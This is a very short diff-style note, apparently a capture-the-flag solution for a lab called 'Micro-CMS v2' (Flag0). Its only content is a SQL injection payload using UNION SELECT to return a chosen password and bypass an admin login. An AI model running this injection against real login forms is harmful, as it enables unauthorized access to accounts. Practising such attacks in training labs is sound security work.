@@ -1,1 +1,4 @@
+2.	Micro-CMS v2
+Flag0 
 
++ ' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1 
